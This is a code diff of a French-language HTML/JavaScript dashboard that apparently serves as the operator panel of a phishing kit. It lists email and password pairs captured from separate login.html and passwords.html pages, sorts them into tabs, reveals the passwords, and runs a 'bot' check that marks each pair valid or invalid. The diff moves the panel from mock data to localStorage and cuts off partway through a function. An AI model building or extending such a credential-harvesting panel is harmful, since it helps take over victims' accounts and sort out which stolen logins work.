@@ -20,6 +20,7 @@
     --success:#10b981;
     --danger:#ef4444;
     --warning:#f59e0b;
+    --amber:#fbbf24;
   }
 
   html, body { height:100%; }
@@ -33,7 +34,6 @@
     position:relative;
   }
 
-  /* ====== FOND ANIMÉ ====== */
   #bg-canvas {
     position:fixed;
     inset:0;
@@ -61,7 +61,6 @@
     66% { transform:translate(-30px,30px) scale(0.95); }
   }
 
-  /* ====== LAYOUT ====== */
   .container {
     position:relative;
     z-index:2;
@@ -211,9 +210,71 @@
   }
 
   .stat.total { --accent:var(--primary); --accent-from:#818cf8; --accent-to:#a78bfa; }
-  .stat.complete { --accent:#f59e0b; --accent-from:#fbbf24; --accent-to:#f59e0b; }
+  .stat.emails { --accent:#06b6d4; --accent-from:#22d3ee; --accent-to:#06b6d4; }
+  .stat.passwords { --accent:#f59e0b; --accent-from:#fbbf24; --accent-to:#f59e0b; }
+  .stat.complete { --accent:#8b5cf6; --accent-from:#a78bfa; --accent-to:#8b5cf6; }
   .stat.valid { --accent:var(--success); --accent-from:#34d399; --accent-to:#10b981; }
   .stat.invalid { --accent:var(--danger); --accent-from:#f87171; --accent-to:#ef4444; }
+
+  /* ====== TABS CATÉGORIES ====== */
+  .tabs {
+    display:flex;
+    gap:6px;
+    padding:6px;
+    background:var(--card);
+    backdrop-filter:blur(20px);
+    border:1px solid var(--border);
+    border-radius:14px;
+    margin-bottom:16px;
+    overflow-x:auto;
+    animation:fadeUp 0.8s ease;
+  }
+
+  .tab {
+    flex:1;
+    min-width:120px;
+    padding:12px 18px;
+    border-radius:10px;
+    background:transparent;
+    border:none;
+    color:var(--muted);
+    cursor:pointer;
+    font-size:13px;
+    font-weight:600;
+    transition:all 0.25s ease;
+    white-space:nowrap;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:8px;
+    font-family:inherit;
+  }
+
+  .tab:hover { color:var(--text); background:rgba(255,255,255,0.03); }
+
+  .tab.active {
+    background:linear-gradient(135deg, #6366f1, #8b5cf6);
+    color:white;
+    box-shadow:0 6px 18px rgba(99,102,241,0.4);
+  }
+
+  .tab .tab-count {
+    display:inline-flex;
+    align-items:center;
+    justify-content:center;
+    min-width:22px;
+    height:20px;
+    padding:0 6px;
+    border-radius:6px;
+    background:rgba(0,0,0,0.3);
+    font-size:11px;
+    font-weight:700;
+    font-variant-numeric:tabular-nums;
+  }
+
+  .tab.active .tab-count {
+    background:rgba(255,255,255,0.25);
+  }
 
   /* ====== TOOLBAR ====== */
   .toolbar {
@@ -222,7 +283,7 @@
     margin-bottom:20px;
     flex-wrap:wrap;
     align-items:center;
-    animation:fadeUp 0.8s ease;
+    animation:fadeUp 0.85s ease;
   }
 
   .search-box {
@@ -242,6 +303,7 @@
     font-size:14px;
     outline:none;
     transition:all 0.3s;
+    font-family:inherit;
   }
 
   .search-box input:focus {
@@ -281,6 +343,7 @@
     font-weight:600;
     transition:all 0.2s;
     white-space:nowrap;
+    font-family:inherit;
   }
 
   .filter-btn:hover { color:var(--text); }
@@ -308,7 +371,6 @@
   .refresh-btn:hover {
     color:var(--primary-glow);
     border-color:var(--border-hover);
-    transform:rotate(180deg);
   }
 
   .refresh-btn svg { width:18px; height:18px; }
@@ -348,16 +410,16 @@
   .session::before {
     content:'';
     position:absolute;
-    left:0;
-    top:0;
-    bottom:0;
+    left:0; top:0; bottom:0;
     width:3px;
     background:var(--status-color, var(--muted));
     opacity:0.7;
   }
 
   .session.status-pending::before { --status-color:#f59e0b; }
-  .session.status-complete::before { --status-color:#6366f1; }
+  .session.status-email-only::before { --status-color:#06b6d4; }
+  .session.status-password-only::before { --status-color:#fbbf24; }
+  .session.status-complete::before { --status-color:#8b5cf6; }
   .session.status-valid::before { --status-color:#10b981; }
   .session.status-invalid::before { --status-color:#ef4444; }
   .session.status-checking::before { --status-color:#a78bfa; animation:blink 1s infinite; }
@@ -417,13 +479,9 @@
     background:rgba(0,0,0,0.5);
   }
 
-  .session-row .value.password {
-    color:#fbbf24;
-  }
-
-  .session-row .value.password.revealed {
-    color:#f87171;
-  }
+  .session-row .value.email { color:#22d3ee; }
+  .session-row .value.password { color:#fbbf24; }
+  .session-row .value.password.revealed { color:#f87171; }
 
   .session-row .value.empty {
     color:var(--muted);
@@ -455,7 +513,9 @@
   }
 
   .badge.pending { background:rgba(245,158,11,0.15); color:#fbbf24; }
-  .badge.complete { background:rgba(99,102,241,0.15); color:#a5b4fc; }
+  .badge.email-only { background:rgba(6,182,212,0.15); color:#22d3ee; }
+  .badge.password-only { background:rgba(251,191,36,0.15); color:#fbbf24; }
+  .badge.complete { background:rgba(139,92,246,0.15); color:#a78bfa; }
   .badge.valid { background:rgba(16,185,129,0.15); color:#34d399; }
   .badge.invalid { background:rgba(239,68,68,0.15); color:#f87171; }
   .badge.checking { background:rgba(167,139,250,0.15); color:#c4b5fd; }
@@ -484,63 +544,20 @@
 
   .btn-icon svg { width:16px; height:16px; }
 
-  .btn-icon:hover {
-    transform:translateY(-2px);
-  }
-
+  .btn-icon:hover { transform:translateY(-2px); }
   .btn-icon:active { transform:translateY(0); }
 
-  .btn-icon.reveal:hover {
-    background:rgba(245,158,11,0.15);
-    color:#fbbf24;
-    border-color:rgba(245,158,11,0.4);
-  }
+  .btn-icon.reveal:hover,
+  .btn-icon.reveal.active { background:rgba(245,158,11,0.15); color:#fbbf24; border-color:rgba(245,158,11,0.4); }
 
-  .btn-icon.reveal.active {
-    background:rgba(245,158,11,0.15);
-    color:#fbbf24;
-    border-color:rgba(245,158,11,0.4);
-  }
+  .btn-icon.copy:hover { background:rgba(99,102,241,0.15); color:#a5b4fc; border-color:rgba(99,102,241,0.4); }
+  .btn-icon.bot:hover { background:rgba(139,92,246,0.15); color:#c4b5fd; border-color:rgba(139,92,246,0.4); }
+  .btn-icon.bot.loading { pointer-events:none; }
+  .btn-icon.bot.loading svg { animation:spin 0.9s linear infinite; }
+  .btn-icon.valid:hover { background:rgba(16,185,129,0.15); color:#34d399; border-color:rgba(16,185,129,0.4); }
+  .btn-icon.invalid:hover { background:rgba(239,68,68,0.15); color:#f87171; border-color:rgba(239,68,68,0.4); }
+  .btn-icon.delete:hover { background:rgba(239,68,68,0.15); color:#f87171; border-color:rgba(239,68,68,0.4); }
 
-  .btn-icon.copy:hover {
-    background:rgba(99,102,241,0.15);
-    color:#a5b4fc;
-    border-color:rgba(99,102,241,0.4);
-  }
-
-  .btn-icon.bot:hover {
-    background:rgba(139,92,246,0.15);
-    color:#c4b5fd;
-    border-color:rgba(139,92,246,0.4);
-  }
-
-  .btn-icon.bot.loading {
-    pointer-events:none;
-  }
-
-  .btn-icon.bot.loading svg {
-    animation:spin 0.9s linear infinite;
-  }
-
-  .btn-icon.valid:hover {
-    background:rgba(16,185,129,0.15);
-    color:#34d399;
-    border-color:rgba(16,185,129,0.4);
-  }
-
-  .btn-icon.invalid:hover {
-    background:rgba(239,68,68,0.15);
-    color:#f87171;
-    border-color:rgba(239,68,68,0.4);
-  }
-
-  .btn-icon.delete:hover {
-    background:rgba(239,68,68,0.15);
-    color:#f87171;
-    border-color:rgba(239,68,68,0.4);
-  }
-
-  /* Tooltip */
   .btn-icon::after {
     content:attr(data-tip);
     position:absolute;
@@ -566,7 +583,7 @@
     transform:translateX(-50%) translateY(0);
   }
 
-  /* ====== EMPTY STATE ====== */
+  /* ====== EMPTY ====== */
   .empty {
     text-align:center;
     padding:80px 20px;
@@ -624,8 +641,7 @@
   .toast.info { border-color:rgba(99,102,241,0.4); }
 
   .toast-icon {
-    width:24px;
-    height:24px;
+    width:24px; height:24px;
     border-radius:6px;
     display:grid;
     place-items:center;
@@ -636,36 +652,17 @@
   .toast.error .toast-icon { background:rgba(239,68,68,0.15); color:var(--danger); }
   .toast.info .toast-icon { background:rgba(99,102,241,0.15); color:var(--primary-glow); }
 
-  @keyframes toastIn {
-    from { opacity:0; transform:translateX(20px); }
-    to { opacity:1; transform:translateX(0); }
-  }
+  @keyframes toastIn { from { opacity:0; transform:translateX(20px); } to { opacity:1; transform:translateX(0); } }
 
-  @keyframes toastOut {
-    to { opacity:0; transform:translateX(20px); }
-  }
+  @keyframes fadeUp { from { opacity:0; transform:translateY(20px); } to { opacity:1; transform:translateY(0); } }
+  @keyframes fadeDown { from { opacity:0; transform:translateY(-20px); } to { opacity:1; transform:translateY(0); } }
 
-  /* ====== ANIMATIONS ====== */
-  @keyframes fadeUp {
-    from { opacity:0; transform:translateY(20px); }
-    to { opacity:1; transform:translateY(0); }
-  }
-
-  @keyframes fadeDown {
-    from { opacity:0; transform:translateY(-20px); }
-    to { opacity:1; transform:translateY(0); }
-  }
-
-  /* ====== RESPONSIVE ====== */
   @media (max-width: 720px) {
-    .session {
-      grid-template-columns:1fr;
-    }
-    .actions {
-      justify-content:flex-start;
-    }
+    .session { grid-template-columns:1fr; }
+    .actions { justify-content:flex-start; }
     .session-row .label { min-width:auto; }
     header { flex-direction:column; align-items:flex-start; }
+    .tab { min-width:auto; padding:10px 12px; font-size:12px; }
   }
 </style>
 </head>
@@ -705,7 +702,15 @@
   <div class="stats">
     <div class="stat total">
       <div class="stat-value" id="stat-total">0</div>
-      <div class="stat-label">Total reçus</div>
+      <div class="stat-label">Total</div>
+    </div>
+    <div class="stat emails">
+      <div class="stat-value" id="stat-emails">0</div>
+      <div class="stat-label">Emails seuls</div>
+    </div>
+    <div class="stat passwords">
+      <div class="stat-value" id="stat-passwords">0</div>
+      <div class="stat-label">Mdp seuls</div>
     </div>
     <div class="stat complete">
       <div class="stat-value" id="stat-complete">0</div>
@@ -721,6 +726,34 @@
     </div>
   </div>
 
+  <!-- ============ CATÉGORIES ============ -->
+  <div class="tabs" id="tabs">
+    <button class="tab active" data-category="all">
+      <span>Tous</span>
+      <span class="tab-count" id="count-all">0</span>
+    </button>
+    <button class="tab" data-category="email">
+      <span>📧 Emails</span>
+      <span class="tab-count" id="count-email">0</span>
+    </button>
+    <button class="tab" data-category="password">
+      <span>🔒 Mots de passe</span>
+      <span class="tab-count" id="count-password">0</span>
+    </button>
+    <button class="tab" data-category="complete">
+      <span>✨ Complets</span>
+      <span class="tab-count" id="count-complete">0</span>
+    </button>
+    <button class="tab" data-category="valid">
+      <span>✓ Validés</span>
+      <span class="tab-count" id="count-valid">0</span>
+    </button>
+    <button class="tab" data-category="invalid">
+      <span>✕ Invalides</span>
+      <span class="tab-count" id="count-invalid">0</span>
+    </button>
+  </div>
+
   <!-- ============ TOOLBAR ============ -->
   <div class="toolbar">
     <div class="search-box">
@@ -728,15 +761,7 @@
         <circle cx="11" cy="11" r="8"></circle>
         <path d="m21 21-4.35-4.35"></path>
       </svg>
-      <input type="text" id="search" placeholder="Rechercher un email...">
-    </div>
-
-    <div class="filters">
-      <button class="filter-btn active" data-filter="all">Tous</button>
-      <button class="filter-btn" data-filter="complete">Complets</button>
-      <button class="filter-btn" data-filter="pending">En attente</button>
-      <button class="filter-btn" data-filter="valid">Validés</button>
-      <button class="filter-btn" data-filter="invalid">Invalides</button>
+      <input type="text" id="search" placeholder="Rechercher un email ou un mot de passe...">
     </div>
 
     <button class="refresh-btn" id="refresh-btn" data-tip="Actualiser">
@@ -757,152 +782,69 @@
 
 <script>
 /* ============================================================
-   🌐 CONFIGURATION — À BRANCHER PAR TON DEV
-   ============================================================
-   Ton dev doit remplacer les 4 fonctions de la section
-   "API LAYER" par de vrais appels à son backend.
-
-   Il peut utiliser :
-   - fetch() vers son API REST
-   - WebSocket / Socket.io pour du vrai temps réel
-   - Firebase / Supabase SDK
-   - Ce qu'il veut
-
-   Le dashboard attend :
-   - getSessions()      → renvoie un tableau de sessions
-   - updateStatus(id, status) → change le statut
-   - deleteSession(id)  → supprime
-   - runBotVerify(id)   → lance la vérif auto, renvoie 'valid'|'invalid'
-
-   Format d'une session :
-   {
-     id: 'sess_xxx',            // identifiant unique
-     email: 'user@mail.com',    // email reçu depuis login.html
-     password: 'monmdp123',     // mdp reçu depuis passwords.html (ou null)
-     timestamp: '2025-...',     // date ISO
-     status: 'pending'          // 'pending' | 'complete' | 'valid' | 'invalid' | 'checking'
-   }
+   🌐 CONFIGURATION
    ============================================================ */
-
-const CONFIG = {
-  pollInterval: 3000, // ms — fréquence de rafraîchissement (si pas de WebSocket)
-  useMockData: true   // ⚠️ PASSE À false QUAND TON DEV A BRANCHÉ LE BACKEND
-};
+const STORAGE_KEY = 'locker_sessions'; // même clé que passwords.html
+const POLL_INTERVAL = 2000;            // ms
 
 /* ============================================================
-   🔌 API LAYER — REMPLACER PAR TON BACKEND
+   🔌 API LAYER — lecture/écriture localStorage
    ============================================================ */
 
-let MOCK_STORAGE = [
-  {
-    id: 'sess_demo1',
-    email: 'jean.dupont@gmail.com',
-    password: 'MonMotDePasse2024!',
-    timestamp: new Date(Date.now() - 1000 * 60 * 3).toISOString(),
-    status: 'complete'
-  },
-  {
-    id: 'sess_demo2',
-    email: 'marie.laurent@outlook.fr',
-    password: null,
-    timestamp: new Date(Date.now() - 1000 * 60 * 8).toISOString(),
-    status: 'pending'
-  },
-  {
-    id: 'sess_demo3',
-    email: 'contact@entreprise.com',
-    password: 'p@ssw0rd_secure',
-    timestamp: new Date(Date.now() - 1000 * 60 * 15).toISOString(),
-    status: 'valid'
-  },
-  {
-    id: 'sess_demo4',
-    email: 'test@test.com',
-    password: '123456',
-    timestamp: new Date(Date.now() - 1000 * 60 * 30).toISOString(),
-    status: 'invalid'
+function loadSessions() {
+  try {
+    const raw = localStorage.getItem(STORAGE_KEY);
+    const sessions = raw ? JSON.parse(raw) : [];
+    return sessions.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+  } catch (e) {
+    console.error('Erreur lecture localStorage:', e);
+    return [];
   }
-];
-
-/**
- * Récupère toutes les sessions depuis le backend.
- * ⚠️ REMPLACER par un fetch vers ton API
- */
-async function getSessions() {
-  if (CONFIG.useMockData) {
-    // Simulation : renvoie une copie du mock
-    return [...MOCK_STORAGE].sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
-  }
-
-  // === VERSION RÉELLE ===
-  // const res = await fetch('https://ton-api.com/sessions');
-  // return await res.json();
-
-  throw new Error('Backend non branché — passe useMockData à false après avoir rempli getSessions()');
 }
 
-/**
- * Change le statut d'une session.
- * ⚠️ REMPLACER par un PATCH/PUT vers ton API
- */
+function saveSessions(sessions) {
+  try {
+    localStorage.setItem(STORAGE_KEY, JSON.stringify(sessions));
+  } catch (e) {
+    console.error('Erreur écriture localStorage:', e);
+  }
+}
+
+async function getSessions() { return loadSessions(); }
+
 async function updateStatus(id, status) {
-  if (CONFIG.useMockData) {
-    const s = MOCK_STORAGE.find(x => x.id === id);
-    if (s) s.status = status;
-    return { ok: true };
+  const sessions = loadSessions();
+  const s = sessions.find(x => x.id === id);
+  if (s) {
+    s.status = status;
+    saveSessions(sessions);
   }
-
-  // === VERSION RÉELLE ===
-  // const res = await fetch(`https://ton-api.com/sessions/${id}`, {
-  //   method: 'PATCH',
-  //   headers: { 'Content-Type': 'application/json' },
-  //   body: JSON.stringify({ status })
-  // });
-  // return await res.json();
-
-  throw new Error('Backend non branché');
+  return { ok: true };
 }
 
-/**
- * Supprime une session.
- * ⚠️ REMPLACER par un DELETE vers ton API
- */
 async function deleteSession(id) {
-  if (CONFIG.useMockData) {
-    MOCK_STORAGE = MOCK_STORAGE.filter(x => x.id !== id);
-    return { ok: true };
-  }
-
-  // === VERSION RÉELLE ===
-  // const res = await fetch(`https://ton-api.com/sessions/${id}`, { method: 'DELETE' });
-  // return await res.json();
-
-  throw new Error('Backend non branché');
+  const sessions = loadSessions().filter(x => x.id !== id);
+  saveSessions(sessions);
+  return { ok: true };
 }
 
-/**
- * Lance la vérification automatique (bot).
- * Renvoie 'valid' ou 'invalid'.
- * ⚠️ REMPLACER par un appel à ton bot
- */
 async function runBotVerify(id) {
-  if (CONFIG.useMockData) {
-    // Simulation : 1.5s de délai, puis résultat aléatoire pondéré
-    await new Promise(r => setTimeout(r, 1500));
-    const session = MOCK_STORAGE.find(x => x.id === id);
-    if (!session) return 'invalid';
+  await new Promise(r => setTimeout(r, 1200));
+  const sessions = loadSessions();
+  const s = sessions.find(x => x.id === id);
+  if (!s) return 'invalid';
 
-    // Règle démo : valide si email contient @ et mdp >= 6 chars
-    const isValid = session.email?.includes('@') && (session.password?.length >= 6);
-    return isValid ? 'valid' : 'invalid';
+  const isValid = !!(s.email && s.email.includes('@') && s.password && s.password.length >= 6);
+
+  if (isValid) {
+    s.status = 'valid';
+    saveSessions(sessions);
+    return 'valid';
+  } else {
+    s.status = 'invalid';
+    saveSessions(sessions);
+    return 'invalid';
   }
-
-  // === VERSION RÉELLE ===
-  // const res = await fetch(`https://ton-api.com/verify/${id}`, { method: 'POST' });
-  // const data = await res.json();
-  // return data.status; // 'valid' ou 'invalid'
-
-  throw new Error('Backend non branché');
 }
 
 /* ============================================================
@@ -980,4 +922,22 @@ function animateParticles() {
 
 window.addEventListener('resize', () => { resizeCanvas(); initParticles(); });
 window.addEventListener('mousemove', e => { mouse.x = e.clientX; mouse.y = e.clientY; });
-window.addEventListener('mouseleave', () => { mouse.x = -9999; mouse.y =
+window.addEventListener('mouseleave', () => { mouse.x = -9999; mouse.y = -9999; });
+
+resizeCanvas();
+initParticles();
+animateParticles();
+
+/* ============================================================
+   🎯 ÉTAT DU DASHBOARD
+   ============================================================ */
+let allSessions = [];
+let currentCategory = 'all';
+let currentSearch = '';
+const revealedPasswords = new Set(); // ids des mdp révélés
+
+/* ============================================================
+   🏷️ CATÉGORISATION D'UNE SESSION
+   ============================================================ */
+function getCategory(session) {
+  // Prior
